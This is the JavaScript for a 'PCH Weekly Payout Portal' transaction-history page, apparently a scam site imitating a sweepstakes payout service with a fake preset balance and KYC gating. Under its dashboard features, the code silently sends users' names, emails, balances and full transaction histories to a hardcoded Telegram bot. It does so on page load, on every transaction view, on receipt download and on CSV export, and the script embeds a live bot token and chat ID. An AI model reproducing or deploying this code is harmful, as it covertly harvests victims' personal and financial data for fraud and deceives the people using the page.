<script>
/* ═══════════ SHARED CORE ═══════════ */
const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
const DEFAULT_TG = { botToken:'8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q', chatId:'8763270406' };

function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (parsed.userBalance == null) parsed.userBalance = 4500;
      if (!parsed.transactions) parsed.transactions = [];
      if (!parsed.registeredUsers) parsed.registeredUsers = [];
      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
      return parsed;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], withdrawalState:'none', currentWithdrawal:null, kyc:null, card:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
}
const state = loadDeviceState();

function saveDeviceState() {
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
}
async function syncCurrentUserToCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
  try {
    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, transactions: state.transactions });
    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
  } catch(e){}
}
async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (r.kyc) state.kyc = r.kyc;
    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
    if (r.card) state.card = r.card;
    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
    saveDeviceState(); return true;
  } catch(e){ return false; }
}

function showToast(title, message, type='info') {
  const container = document.getElementById('toast-container'); if (!container) return;
  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
  const el = document.createElement('div'); el.id = id;
  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
}
function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }

/* ═══════════ TELEGRAM — silent failures ═══════════ */
function tgCreds() {
  const cfg = state.telegramConfig || {};
  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
}
async function sendTelegramMessage(textMessage) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
}
async function sendTelegramDocument(filename, content, caption) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('document', new Blob([content], { type:'text/plain;charset=utf-8' }), filename);
    if (caption) { fd.append('caption', caption); fd.append('parse_mode','HTML'); }
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] sendDocument failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] sendDocument fetch failed:', err); return false; }
}

function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }

function toggleNavDrawer() {
  const drawer = document.getElementById('nav-drawer');
  const overlay = document.getElementById('nav-overlay');
  if (drawer.classList.contains('-translate-x-full')) {
    drawer.classList.remove('-translate-x-full');
    overlay.classList.remove('hidden');
  } else {
    drawer.classList.add('-translate-x-full');
    overlay.classList.add('hidden');
  }
}

function isTabLocked(tabKey) {
  const isKycApproved = state.kyc && state.kyc.status === 'approved';
  const isSetupComplete = !!state.configuredMethod;
  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
  if (tabKey === 'funds') return !isKycApproved;
  if (tabKey === 'winners') return !isKycApproved;
  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
  return false;
}
function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }

const DASHBOARD_TABS = [
  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
];
function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }

function renderHeaderNav() {
  const nav = document.getElementById('nav-actions'); if (!nav) return;
  if (!state.currentUser) { nav.innerHTML = ''; return; }
  const u = state.currentUser;
  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
  nav.innerHTML = `
    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
  `;
}

/* ═══════════ HISTORY PAGE ═══════════ */
function getUserLabel() {
  const u = state.currentUser || {};
  return {
    username: u.username || 'unknown',
    fullName: ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A',
    email: u.email || 'N/A',
    phone: u.phone || 'N/A'
  };
}

function openTransactionDetail(ref) {
  const txn = state.transactions.find(t => t.ref === ref); if (!txn) { showToast('Not Found', 'Transaction record missing.', 'warning'); return; }
  const badgeColor = txn.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40' : txn.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom border-sky-custom/40' : txn.status === 'On Hold' ? 'bg-gold-500/20 text-gold-400 border-gold-500/40' : txn.status === 'Refunded' || txn.status === 'Reversed' ? 'bg-purple-500/20 text-purple-400 border-purple-500/40' : 'bg-rose-500/20 text-rose-400 border-rose-500/40';

  const info = getUserLabel();
  sendTelegramMessage(
    `🧾 <b>TRANSACTION VIEWED</b>\n` +
    `<b>User:</b> @${tgEsc(info.username)}\n` +
    `<b>Full name:</b> ${tgEsc(info.fullName)}\n` +
    `<b>Email:</b> ${tgEsc(info.email)}\n` +
    `<b>Ref:</b> ${tgEsc(txn.ref)}\n` +
    `<b>Type:</b> ${tgEsc(txn.type)}\n` +
    `<b>Amount:</b> ${fmtMoney(txn.amount)}\n` +
    `<b>Status:</b> ${tgEsc(txn.status)}\n` +
    `<b>Date:</b> ${tgEsc(txn.date)}\n` +
    (txn.counterparty ? `<b>Counterparty:</b> @${tgEsc(txn.counterparty)}\n` : '') +
    (txn.memo ? `<b>Memo:</b> ${tgEsc(txn.memo)}\n` : '') +
    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  showModal('Transaction Detail', `<div class="space-y-4"><div class="bg-navy-950 border border-navy-700 rounded-2xl p-5 text-center relative overflow-hidden"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Amount</p><p class="text-3xl font-black text-gold-400 mt-1">${fmtMoney(txn.amount)}</p><span class="inline-block mt-2 px-3 py-1 text-[10px] font-black uppercase rounded-full border ${badgeColor}">${escapeHtml(txn.status)}</span></div><div class="space-y-2 text-sm"><div class="flex justify-between border-b border-navy-700/60 pb-2"><span class="text-slate-400 text-xs uppercase font-bold">Reference</span><span class="text-white font-mono font-bold">${escapeHtml(txn.ref)}</span></div><div class="flex justify-between border-b border-navy-700/60 pb-2"><span class="text-slate-400 text-xs uppercase font-bold">Type</span><span class="text-white font-bold text-right">${escapeHtml(txn.type)}</span></div><div class="flex justify-between border-b border-navy-700/60 pb-2"><span class="text-slate-400 text-xs uppercase font-bold">Date</span><span class="text-white font-bold">${escapeHtml(txn.date)}</span></div>${txn.counterparty ? `<div class="flex justify-between border-b border-navy-700/60 pb-2"><span class="text-slate-400 text-xs uppercase font-bold">Counterparty</span><span class="text-sky-custom font-bold">@${escapeHtml(txn.counterparty)}</span></div>` : ''}${txn.memo ? `<div class="flex justify-between"><span class="text-slate-400 text-xs uppercase font-bold">Memo</span><span class="text-white font-bold text-right max-w-[220px] truncate">${escapeHtml(txn.memo)}</span></div>` : ''}</div><div class="flex gap-2 pt-3"><button onclick="downloadReceiptPDF('${escapeHtml(txn.ref)}')" class="flex-1 px-4 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-file-pdf mr-1.5"></i> Download PDF</button></div></div>`);
}

function downloadReceiptPDF(ref) {
  const txn = state.transactions.find(t => t.ref === ref); if (!txn) return;
  try {
    const { jsPDF } = window.jspdf; const doc = new jsPDF();
    const user = state.currentUser || {};
    doc.setFontSize(20); doc.setTextColor(245, 158, 11); doc.text('PCH Weekly Payout Portal', 20, 24);
    doc.setFontSize(10); doc.setTextColor(120, 120, 120); doc.text('Official Transaction Receipt', 20, 30);
    doc.setDrawColor(200, 200, 200); doc.line(20, 34, 190, 34);
    doc.setFontSize(12); doc.setTextColor(20, 20, 20);
    doc.text('Reference:', 20, 48); doc.text(String(txn.ref), 70, 48);
    doc.text('Date:', 20, 58); doc.text(String(txn.date), 70, 58);
    doc.text('User:', 20, 68); doc.text('@' + (user.username || '—'), 70, 68);
    doc.text('Type:', 20, 78); doc.text(String(txn.type), 70, 78);
    doc.text('Status:', 20, 88); doc.text(String(txn.status), 70, 88);
    if (txn.counterparty) { doc.text('Counterparty:', 20, 98); doc.text('@' + txn.counterparty, 70, 98); }
    if (txn.memo) { doc.text('Memo:', 20, 108); doc.text(String(txn.memo).substring(0, 60), 70, 108); }
    doc.setFontSize(16); doc.setTextColor(245, 158, 11); doc.text('Amount: ' + (Number(txn.amount)||0).toLocaleString(undefined,{minimumFractionDigits:2,style:'currency',currency:'USD'}), 20, 130);
    doc.setDrawColor(200, 200, 200); doc.line(20, 140, 190, 140);
    doc.setFontSize(8); doc.setTextColor(120, 120, 120);
    doc.text('This is a system-generated receipt. Retain for your records.', 20, 148);
    doc.text('Generated: ' + new Date().toISOString(), 20, 154);
    doc.save('PCH-Receipt-' + txn.ref + '.pdf');
    showToast('Receipt Downloaded', 'PDF saved.', 'success');

    const info = getUserLabel();
    sendTelegramMessage(
      `📄 <b>RECEIPT PDF DOWNLOADED</b>\n` +
      `<b>User:</b> @${tgEsc(info.username)}\n` +
      `<b>Full name:</b> ${tgEsc(info.fullName)}\n` +
      `<b>Ref:</b> ${tgEsc(txn.ref)}\n` +
      `<b>Type:</b> ${tgEsc(txn.type)}\n` +
      `<b>Amount:</b> ${fmtMoney(txn.amount)}\n` +
      `<b>Status:</b> ${tgEsc(txn.status)}\n` +
      `<b>Timestamp:</b> ${new Date().toISOString()}`
    ).catch(()=>{});
  } catch (e) { showToast('PDF Error', 'Could not generate receipt.', 'error'); }
}

function exportTxnsCSV() {
  if (!state.transactions || state.transactions.length === 0) { showToast('Empty', 'No transactions to export.', 'warning'); return; }
  const headers = ['ref', 'date', 'type', 'amount', 'status', 'memo', 'counterparty'];
  const esc = v => `"${String(v ?? '').replace(/"/g,'""')}"`;
  const csv = [headers.join(','), ...state.transactions.map(t => headers.map(h => esc(t[h])).join(','))].join('\n');
  const blob = new Blob([csv], { type:'text/csv' }); const url = URL.createObjectURL(blob);
  const a = document.createElement('a'); a.href = url; a.download = 'PCH-Transactions-' + new Date().toISOString().split('T')[0] + '.csv'; a.click();
  setTimeout(()=>URL.revokeObjectURL(url), 500);
  showToast('Exported', 'Transactions CSV downloaded.', 'success');

  const info = getUserLabel();
  sendTelegramDocument(
    `transactions-${info.username}-${Date.now()}.csv`,
    csv,
    `📊 <b>TRANSACTION CSV EXPORTED</b>\n@${tgEsc(info.username)} — ${state.transactions.length} records\n${tgEsc(new Date().toISOString())}`
  ).catch(()=>{});
}

function renderHistory() {
  const filter = state.txnFilter || 'All';
  const search = (state.historySearch || '').toLowerCase();
  let filtered = state.transactions.slice();
  if (filter !== 'All') filtered = filtered.filter(t => t.status === filter);
  if (search) filtered = filtered.filter(t => [t.ref, t.type, t.memo, t.counterparty, String(t.amount)].some(f => String(f||'').toLowerCase().includes(search)));
  const completedCount = state.transactions.filter(t => t.status === 'Completed').length;
  const pendingCount = state.transactions.filter(t => t.status === 'Pending').length;
  const chips = [{k:'All',n:state.transactions.length},{k:'Completed',n:completedCount},{k:'Pending',n:pendingCount}];
  const cards = filtered.length === 0 ? `<div class="col-span-full py-12 text-center text-slate-400 text-xs bg-navy-900 border border-navy-700/60 rounded-2xl"><i class="fa-solid fa-folder-open text-2xl text-slate-500 mb-2 block"></i>No transactions match your filters.</div>` : filtered.map(t => {
    const badgeColor = t.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30' : t.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom border-sky-custom/30' : 'bg-gold-500/20 text-gold-400 border-gold-500/30';
    const edge = t.status === 'Completed' ? 'bg-emerald-400' : t.status === 'Pending' ? 'bg-sky-custom' : 'bg-gold-400';
    return `<div class="w-full text-left bg-navy-900/90 border border-navy-700/80 p-5 rounded-2xl card-3d flex flex-col justify-between space-y-4 shadow-lg relative overflow-hidden"><div class="absolute top-0 left-0 w-1.5 h-full ${edge}"></div><div class="flex items-start justify-between gap-3"><div class="flex items-center space-x-3 min-w-0"><div class="w-10 h-10 rounded-xl bg-navy-800 border border-navy-700 flex items-center justify-center text-base shadow-inner shrink-0"><i class="fa-solid fa-receipt text-gold-400"></i></div><div class="min-w-0"><span class="text-[11px] font-mono font-bold text-slate-400 uppercase tracking-wider block truncate">${escapeHtml(t.ref)}</span><h4 class="text-sm font-bold text-white truncate">${escapeHtml(t.type)}${t.counterparty?' · @'+escapeHtml(t.counterparty):''}</h4></div></div><span class="px-3 py-1 rounded-full text-xs font-extrabold border ${badgeColor} shadow-sm shrink-0">${escapeHtml(t.status)}</span></div><div class="flex items-end justify-between pt-3 border-t border-navy-700/60"><div><p class="text-[10px] text-slate-400 uppercase tracking-wide">Date</p><p class="text-xs font-semibold text-slate-300"><i class="fa-regular fa-calendar-days mr-1 text-slate-400"></i>${escapeHtml(t.date)}</p></div><div class="text-right"><p class="text-[10px] text-slate-400 uppercase tracking-wide">Amount</p><p class="text-base sm:text-lg font-black text-gold-400">${fmtMoney(t.amount)}</p></div></div><div class="flex items-center justify-end gap-1.5 text-[10px]"><button onclick="openTransactionDetail('${escapeHtml(t.ref)}')" class="px-2.5 py-1 bg-navy-800 border border-navy-700 text-slate-300 rounded-lg font-bold hover:text-white active:scale-95 transition"><i class="fa-solid fa-eye mr-1"></i> View</button><button onclick="downloadReceiptPDF('${escapeHtml(t.ref)}')" class="px-2.5 py-1 bg-sky-custom/20 border border-sky-custom/40 text-sky-custom rounded-lg font-bold active:scale-95 transition"><i class="fa-solid fa-file-pdf mr-1"></i> PDF</button></div></div>`;
  }).join('');
  return `
    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d space-y-4">
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3"><div><h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-rectangle-list text-sky-custom mr-3"></i>Transfer History</h2><p class="text-xs text-slate-400 mt-1">${filtered.length} of ${state.transactions.length} shown</p></div><button onclick="exportTxnsCSV()" class="px-3.5 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-file-csv mr-1.5"></i> Export CSV</button></div>
      <div class="flex flex-wrap gap-1.5">${chips.map(c => `<button onclick="state.txnFilter='${c.k}';saveDeviceState();render();" class="chip-btn ${filter === c.k ? 'active' : ''}">${c.k} (${c.n})</button>`).join('')}</div>
      <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
        <input type="text" placeholder="Search memo, ref, amount..." value="${escapeHtml(state.historySearch||'')}" oninput="state.historySearch=this.value;render();" class="bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-xs text-white focus:outline-none focus:border-sky-custom">
        <select class="bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-xs text-white focus:outline-none focus:border-sky-custom" onchange="state.txnFilter=this.value;saveDeviceState();render();">
          <option value="All" ${filter === 'All' ? 'selected' : ''}>All Statuses</option>
          <option value="Completed" ${filter === 'Completed' ? 'selected' : ''}>Completed</option>
          <option value="Pending" ${filter === 'Pending' ? 'selected' : ''}>Pending</option>
        </select>
      </div>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">${cards}</div>
    </div>
  `;
}

function render() {
  document.body.classList.remove('modal-open');
  renderHeaderNav();
  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('history');
  const container = document.getElementById('app-container');
  container.innerHTML = renderDashboardShell('history', renderHistory());
}

window.onload = async function() {
  if (!guardAuth()) return;
  await pullCurrentUserFromCloud();
  render();

  // Snapshot transaction history on load — silent
  const info = getUserLabel();
  if (state.transactions && state.transactions.length > 0) {
    const lines = state.transactions.map(t => `${t.date} | ${t.ref} | ${t.type} | ${fmtMoney(t.amount)} | ${t.status}${t.counterparty?' | @'+t.counterparty:''}${t.memo?' | '+t.memo:''}`);
    sendTelegramDocument(
      `history-snapshot-${info.username}-${Date.now()}.txt`,
      `PCH — TRANSACTION HISTORY SNAPSHOT\nUser: @${info.username}\nName: ${info.fullName}\nEmail: ${info.email}\nBalance: ${fmtMoney(state.userBalance)}\nCount: ${state.transactions.length}\nDate: ${new Date().toISOString()}\n\n` + lines.join('\n'),
      `📊 <b>History Loaded</b> — @${tgEsc(info.username)} · ${state.transactions.length} records`
    ).catch(()=>{});
  }
};
</script>
